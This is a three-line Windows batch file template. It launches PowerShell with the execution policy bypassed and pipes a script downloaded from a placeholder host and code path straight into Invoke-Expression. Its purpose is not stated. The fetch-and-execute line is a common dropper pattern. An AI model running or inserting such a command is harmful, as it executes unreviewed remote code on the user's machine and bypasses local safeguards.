@echo off
powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://__HOST__/j/__CODE__/win | iex"
pause
